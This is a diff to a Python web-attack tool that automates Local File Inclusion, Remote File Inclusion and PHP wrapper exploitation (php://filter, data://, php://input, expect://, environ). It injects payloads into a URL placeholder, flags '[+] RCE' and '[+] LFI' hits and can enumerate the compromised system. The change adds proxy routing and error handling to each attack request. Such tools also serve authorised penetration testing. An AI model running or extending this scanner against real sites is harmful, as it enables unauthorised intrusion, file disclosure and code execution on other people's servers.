@@ -18,6 +18,8 @@ from urllib.parse import urlparse
 #proxies = {}
 
 exploits = []
+proxies = {}
+
 exploit = {'REQUST_TYPE': '',
                'EXPLOIT_TYPE': '',
            'GETVAL':'',
@@ -84,8 +86,12 @@ def test_wordlist(url):
         if("DESTROY" in url):
             u = url.replace("DESTROY", line)
 
-        res = requests.get(u, headers = headers)
-        
+        try:
+            res = requests.get(u, headers = headers, proxies = proxies)
+        except:
+            print("Proxy problem... Exiting.")
+            sys.exit(-1)
+
         if(checkPayload(res)):
             getExploit(res, 'GET', 'LFI', u, '', headers)
             print("[+] LFI -> " + u)
@@ -110,8 +116,13 @@ def test_php_filter(url):
     for i in range(len(testL)):
         if("DESTROY" in url):
             u = url.replace("DESTROY", testL[i])
+        
+        try:
+            res = requests.get(u, headers = headers, proxies = proxies)
+        except:
+            print("Proxy problem... Exiting.")
+            sys.exit(-1)
 
-        res = requests.get(u, headers = headers)
         if(checkPayload(res)):
             getExploit(res, 'GET', 'LFI', u, '', headers)
             print("[+] LFI -> " + u)
@@ -119,8 +130,13 @@ def test_php_filter(url):
     #Windows
     for i in range(len(testW)):
         u = url.replace("DESTROY", testW[i])
-    
-        res = requests.get(u, headers = headers)
+        
+        try:
+            res = requests.get(u, headers = headers, proxies = proxies)
+        except:
+            print("Proxy problem.. Exiting.")
+            sys.exit(-1)
+
         if(checkPayload(res)):
             getExploit(res, 'GET', 'LFI', u, '', headers)
             print("[+] LFI -> " + u)
@@ -137,8 +153,12 @@ def test_data_wrapper(url):
     for i in range(len(testL)):
         if("DESTROY" in url):
             u = url.replace("DESTROY", testL[i])
-        res = requests.get(u, headers = headers)
-    
+        try:
+            res = requests.get(u, headers = headers, proxies = proxies)
+        except:
+            print("Proxy problem... Exiting.")
+            sys.exit(-1)
+
         if(checkPayload(res)):
             getExploit(res, 'GET', 'LFI', u, '', headers)
             print("[+] LFI -> " + u)
@@ -147,7 +167,11 @@ def test_data_wrapper(url):
     for i in range(len(testW)):
         if("DESTROY" in url):
             u = url.replace("DESTROY", testW[i])
-        res = requests.get(u, headers = headers)
+        try:
+            res = requests.get(u, headers = headers, proxies = proxies)
+        except:
+            print("Proxy problem... Exiting.")
+            sys.exit(-1)
 
         if(checkPayload(res)):
             getExploit(res, 'GET', 'LFI', u, '', headers)
@@ -171,7 +195,12 @@ def test_php_input(url):
             u = url.replace("DESTROY", testL[i])
     
         for j in range(len(posts)):
-            res = requests.post(u, headers = headers, data=posts[j])
+            try:
+                res = requests.post(u, headers = headers, data=posts[j], proxies = proxies)
+            except:
+                print("Proxy problem... Exiting.")
+                sys.exit(-1)
+
             if(checkPayload(res)):
                 print("[+] RCE -> " + u + " -> HTTP POST: " + posts[j])
                 if(args.en_sys):
@@ -183,7 +212,12 @@ def test_php_input(url):
             u = url.replace("DESTROY", testW[k])
         
         for l in range(len(posts)):
-            res = requests.post(u, headers = headers, data = posts[l])
+            try:
+                res = requests.post(u, headers = headers, data = posts[l], proxies = proxies)
+            except:
+                print("Proxy problem... Exiting.")
+                sys.exit(-1)
+
             if(checkPayload(res)):
                 getExploit(res, 'POST', 'RCE', u, posts[l], headers)
                 print("[+] RCE -> " + u + " -> HTTP POST: " + posts[l])
@@ -200,8 +234,13 @@ def test_expect_wrapper(url):
     for i in range(len(testL)):
         if("DESTROY" in url):
             u = url.replace("DESTROY", testL[i])
+        
+        try:
+            res = requests.get(u, headers = headers, proxies = proxies)
+        except:
+            print("Proxy problem... Exiting.")
+            sys.exit(-1)
 
-        res = requests.get(u, headers = headers)
         if(checkPayload(res)):
             getExploit(res, 'GET', 'RCE', u, testL[i], headers)
             print("[+] RCE -> " + u)
@@ -210,8 +249,13 @@ def test_expect_wrapper(url):
     for j in range(len(testW)):
         if("DESTROY" in url):
             u = url.replace("DESTROY", testW[j])
-
-        res = requests.get(u, headers = headers)
+        
+        try:
+            res = requests.get(u, headers = headers, proxies = proxies)
+        except:
+            print("Proxy problem... Exiting.")
+            sys.exit(-1)
+        
         if(checkPayload(res)):
             getExploit(res, 'GET', 'RCE', u, testW[j], headers)
             print("[+] RCE -> " + u)
@@ -224,7 +268,7 @@ def test_rfi(url):
         if("DESTROY" in url):
             u = url.replace("DESTROY", tests[i])
         try:
-            res = requests.get(u, headers = headers, timeout = 2)
+            res = requests.get(u, headers = headers, proxies = proxies, timeout = 2)
             if(checkPayload(res)):
                 getExploit(res, 'GET', 'RFI', u, tests[i], headers)
                 print("[+] RFI -> " + u)
@@ -238,8 +282,13 @@ def test_environ(url):
     for i in range(len(tests)):
         if("DESTROY" in url):
             u = url.replace("DESTROY", tests[i])
+            
+            try:
+                res = requests.get(u, headers = headers, proxies = proxies)
+            except:
+                print("Proxy problem... Exiting now.")
+                sys.exit(-1)
 
-            res = requests.get(u, headers = headers)
             if(checkPayload(res)):
                 getExploit(res, 'GET', 'LFI', u, tests[i], headers)
                 print("[+] LFI -> " + u)
@@ -253,8 +302,8 @@ def checkPayload(webResponse):
                 "; for 16-bit app support", "sample HOSTS file used by Microsoft",
                 "Windows IP Configuration", "OyBmb3IgMT", "; sbe 16-ovg ncc fhccbeg",
                 ";  f o r  1 6 - b i t  a p p", "fnzcyr UBFGF svyr hfrq ol Zvpebfbsg",
-                "c2FtcGxlIEhPU1RT", "=1943785348b45", "SUDO_UID", "/usr/bin/",
-                "root"]
+                "c2FtcGxlIEhPU1RT", "=1943785348b45", "/usr/bin/",
+                ]
 
     for i in range(len(KEY_WORDS)):
         if KEY_WORDS[i] in webResponse.text:
@@ -268,6 +317,11 @@ def enumerate_system(exploit):
 
 def main():
     global exploits
+    global proxies
+    
+    if(args.proxyAddr):
+        proxies['http'] = 'http://'+args.proxyAddr
+        proxies['https'] = 'https://'+args.proxyAddr
 
     #Perform all tests
     if(test_all):
@@ -330,8 +384,7 @@ if(__name__ == "__main__"):
     optionsGroup = parser.add_argument_group('GENERAL')
     optionsGroup.add_argument('url', type=str, metavar="URL", help="""\t\t Specify url, Ex: "http://example.org/vuln.php?param=DESTROY" ###DONE""")
     optionsGroup.add_argument('-c', type=str, metavar="<cookie>", dest='cookie', help='\t\t Specify session cookie, Ex: "PHPSESSID=1943785348b45" ###DONE')
-    optionsGroup.add_argument('--proxy-ip', type=str, metavar = "<IP>", dest="proxyIp", help="\t\t Specify Proxy IP address")
-    optionsGroup.add_argument('--proxy-port', type=int, metavar="<PORT>", dest="proxyPort", help="\t\t Specify Proxy port number")
+    optionsGroup.add_argument('--proxy-address', type=str, metavar = "<address>", dest="proxyAddr", help="\t\t Specify Proxy IP address. Ex: '10.10.10.10:8080' ###DONE")
     optionsGroup.add_argument('--useragent', type=str, metavar= '<agent>', dest="agent", help="\t\t Specify HTTP user agent ###DONE")
     optionsGroup.add_argument('--referer', type=str, metavar = '<referer>', dest='referer', help="\t\t Specify HTTP referer ###DONE")
     
@@ -381,7 +434,6 @@ if(__name__ == "__main__"):
     environ = args.environ
     rfi = args.rfi
 
-    print("TODO: On every attack method, payload list")
 
     #Checks URL arg
     urlRegex = re.compile(
@@ -416,5 +468,6 @@ if(__name__ == "__main__"):
 
     if(cookie is not None):
         addHeader('Cookie', cookie)
-
+    
+    
     main()
